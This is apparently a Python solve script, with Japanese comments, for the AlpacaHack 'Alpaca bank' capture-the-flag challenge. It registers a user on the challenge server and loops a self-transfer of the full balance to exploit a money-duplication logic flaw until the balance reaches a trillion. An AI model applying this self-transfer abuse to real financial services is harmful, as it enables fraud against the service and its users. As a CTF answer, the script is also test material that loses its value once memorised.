"""Alpaca bank

問題url: https://alpacahack.com/challenges/alpaca-bank

Note:
    自分のIDに送金すると、増える！
    チャレンジサーバーたてて実験してたら見つけちゃいました。
"""

import requests

UserID = str

URL = "http://34.170.146.252:34527/"
TRILLION = 1_000_000_000_000


def register() -> UserID:
    """registerのapiを叩いて、user_idを返す"""
    register_url = URL + "api/register"
    res = requests.post(register_url, timeout=10)
    return res.json()["user"]


def get_user(user: UserID):
    """user_idから、そのユーザーの情報を出力するapi"""
    user_url = URL + f"api/user/{user}"
    res = requests.get(user_url, timeout=10)
    return res.json()


def transfer(from_user: UserID, to_user: UserID, amount: int):
    """ユーザー間での送金をするapiを叩く"""
    transfer_url = URL + "api/transfer"
    res = requests.post(
        transfer_url,
        json={"fromUser": from_user, "toUser": to_user, "amount": amount},
        timeout=10,
    )
    return res.text


def get_balance(user: UserID) -> int:
    """ユーザーIDから所持金を返す"""
    user_json = get_user(user)
    return user_json["balance"]


if __name__ == "__main__":
    my_user_id = register()

    while (balance := get_balance(my_user_id)) < TRILLION:
        transfer(my_user_id, my_user_id, balance)
        print(get_user(my_user_id))
